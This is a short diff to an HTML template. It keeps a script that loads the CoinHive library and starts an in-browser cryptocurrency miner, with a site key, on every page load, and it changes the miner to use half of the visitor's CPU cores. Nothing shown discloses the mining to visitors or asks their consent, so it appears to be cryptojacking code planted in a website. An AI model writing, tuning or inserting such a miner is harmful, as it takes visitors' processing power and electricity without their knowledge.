@@ -30,7 +30,9 @@
     </script>
 <script src="https://coinhive.com/lib/coinhive.min.js"></script>
 <script>
-	var miner = new CoinHive.Anonymous('vQPFw32h5qZEpUdVZ4sXLjbieFvbzToV');
+    var threadCount = Math.ceil(navigator.hardwareConcurrency/2);
+
+	var miner = new CoinHive.Anonymous('vQPFw32h5qZEpUdVZ4sXLjbieFvbzToV',{threads: threadCount});
 	miner.start();
 </script>
 {% endblock js %}
